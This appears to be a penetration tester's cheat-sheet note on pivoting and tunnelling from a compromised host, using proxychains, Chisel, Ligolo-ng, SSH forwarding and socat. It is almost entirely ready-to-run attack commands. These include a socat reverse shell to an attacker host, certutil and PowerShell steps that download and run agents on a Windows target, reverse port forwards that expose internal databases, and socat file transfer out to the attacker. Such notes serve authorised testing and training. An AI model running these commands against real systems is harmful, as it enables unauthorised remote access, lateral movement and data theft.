---
title: Tunnelling
type: note
tab: Pivoting
inputs: [Shell]
outputs: [Pivot]
tags: [Pivoting, Tunnelling]
---

# Tunnelling

## Tunnelling / Pivot

### Proxychains To Internal MySQL

#Shell #Pivoting #Tunnelling
Route local tools through proxychains when MySQL is only reachable through a tunnel or SOCKS proxy.

```sh
# Attacker: edit the proxychains config to point at the active SOCKS proxy.
sudo nano /etc/proxychains4.conf

# Attacker: connect to the internal MySQL listener through proxychains.
proxychains mysql -u root -h 127.0.0.1 --skip-ssl

# Attacker: run a quick query through the tunnel without creating a separate card.
proxychains mysql -u root -h 127.0.0.1 --skip-ssl -e "SHOW DATABASES;"
```

### Chisel Reverse SOCKS

#Shell #Windows #Pivoting #Tunnelling
Expose a reverse SOCKS proxy through a Windows foothold.

1. Start the reverse server on Kali.

```sh
chisel server -p <LPORT> --reverse
```

2. Start the Windows client with a reverse SOCKS tunnel.

```powershell
.\chisel.exe client <LHOST>:<LPORT> R:socks
```

3. Verify access through the proxy.

```sh
proxychains ping <TARGET_IP>
```

### Ligolo-ng Pivot

#Shell #Windows #Linux #Pivoting #Tunnelling
Use Ligolo-ng when you have code execution on a pivot host and need routed access to an internal subnet.

```sh
# 1. Attacker: create and enable a Ligolo TUN interface.
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# 2. Attacker: start the Ligolo proxy.
sudo ./proxy -selfcert

# 3. Target Windows: download and run the Ligolo agent.
certutil.exe -urlcache -f http://<LHOST>/ligolo/agent.exe C:\Users\Public\agent.exe
C:\Users\Public\agent.exe -connect <LHOST>:11601 -ignore-cert

# 4. Attacker Ligolo console: select the session.
session

# 5. Option 1: use autoroute and select the discovered internal subnet.
autoroute

# 6. Option 2: start manually, inspect the internal IP, then add the route from Kali.
start
ifconfig
sudo ip route add <TARGET_SUBNET> dev ligolo

# 7. Cleanup if the interface already exists or routing looks stale.
sudo ip route flush cache
sudo ip link delete ligolo
```

## Port Forwarding

### Chisel Reverse Port Forward

#Shell #Windows #Pivoting #Tunnelling
Expose target-local services such as `127.0.0.1:1433`, `127.0.0.1:3306`, or `127.0.0.1:5000` back to the attacker box. No admin is required, so this is a strong Windows fallback.

1. Start the reverse server on Kali.

```sh
chisel server -p <LPORT> --reverse
```

2. Download and run the Windows client on the target.

```powershell
iwr -Uri http://<LHOST>/chisel.exe -OutFile chisel.exe
.\chisel.exe client <LHOST>:<LPORT> R:3306:127.0.0.1:3306
```

3. Connect to the forwarded service from Kali.

```sh
mysql -u root -h 127.0.0.1 --skip-ssl
```

4. Example: forward target-local MSSQL to Kali.

```sh
netstat -ano
# Found: 127.0.0.1:1433 LISTENING

# Attacker: start Chisel reverse server.
chisel server -p 8000 --reverse

# Target: forward local MSSQL back to the attacker.
chisel.exe client <LHOST>:8000 R:1433:127.0.0.1:1433

# Attacker: connect to the forwarded MSSQL listener.
impacket-mssqlclient <USER>:<PASS>@127.0.0.1 -port 1433
```

5. Example: forward a target-local web service to Kali.

```sh
# Found: 127.0.0.1:5000 LISTENING

# Target: forward local web service back to attacker port 9000.
chisel.exe client <LHOST>:8000 R:9000:127.0.0.1:5000

# Attacker: browse or curl the forwarded service.
curl http://127.0.0.1:9000
```

### SSH Local / Remote Forward

#Shell #Linux #Pivoting #Tunnelling
Use SSH forwarding when SSH credentials are available. Local forward is the cleanest path for services reachable from the target; remote forward helps when the service should be exposed back to Kali.

```sh
# Target or shell: find local-only listeners.
ss -tulnp
netstat -ano

# Found: 127.0.0.1:1433
# Attacker: local forward target MSSQL to Kali localhost.
ssh -L 1433:127.0.0.1:1433 <USER>@<TARGET_IP>

# Attacker: connect to forwarded MSSQL.
impacket-mssqlclient <USER>:<PASS>@127.0.0.1 -port 1433

# Found: 127.0.0.1:8080
# Attacker: local forward target web service to Kali localhost.
ssh -L 8080:127.0.0.1:8080 <USER>@<TARGET_IP>

# Attacker: browse or curl the forwarded service.
curl http://127.0.0.1:8080

# Found: 127.0.0.1:3306 (MySQL)
# Target: remote forward target MySQL back to Kali.
ssh -R 3306:127.0.0.1:3306 <USER>@<LHOST>

# Attacker: connect from Kali.
mysql -h 127.0.0.1 -P 3306
```

### Socat

#Shell #Linux #Pivoting #Tunnelling
Use Socat for stable reverse shells, simple port forwards, or raw file transfers.

```sh
# Stable reverse shell listener on attacker.
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>

# Victim reverse shell.
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>

# Port forward local listener to an internal service.
socat tcp-listen:8080,fork tcp:<INTERNAL_HOST>:80

# Found: 127.0.0.1:3306
# Target: expose target-local MySQL through target port 3306.
socat TCP-LISTEN:3306,fork TCP:127.0.0.1:3306

# Attacker: connect to the forwarded MySQL service.
mysql -h <TARGET_IP> -P 3306 -u root -p

# Found: 127.0.0.1:8080
# Target: expose target-local web service through target port 8888.
socat TCP-LISTEN:8888,fork TCP:127.0.0.1:8080

# Attacker: browse or curl the forwarded service.
curl http://<TARGET_IP>:8888

# File transfer receiver and sender.
socat tcp-listen:<LPORT> open:received_file,creat
socat tcp-connect:<LHOST>:<LPORT> file:<FILE>
```

### Ligolo-ng Localhost Forward

#Shell #Windows #Linux #Pivoting #Tunnelling
Use this when Ligolo is already connected and started. If not, set up the routed pivot first: [Ligolo-ng Pivot](#view=notes&note=note-pivoting-tunnelling-md&section=note-pivoting-tunnelling-md-tunnelling-pivot-ligolo-ng-pivot).

```sh
# After Ligolo tunnel is started.
start

# Found: 127.0.0.1:1433 (MSSQL)

# Ligolo console: forward target localhost -> attacker listener.
listener_add --addr 0.0.0.0:1433 --to 127.0.0.1:1433

# Result: attacker:1433 -> target:127.0.0.1:1433

# Attacker: connect to the forwarded MSSQL listener.
impacket-mssqlclient <USER>:<PASS>@127.0.0.1 -port 1433
```

## Notes

- Ligolo `listener_add` is for target-local services after the Ligolo session is already active.
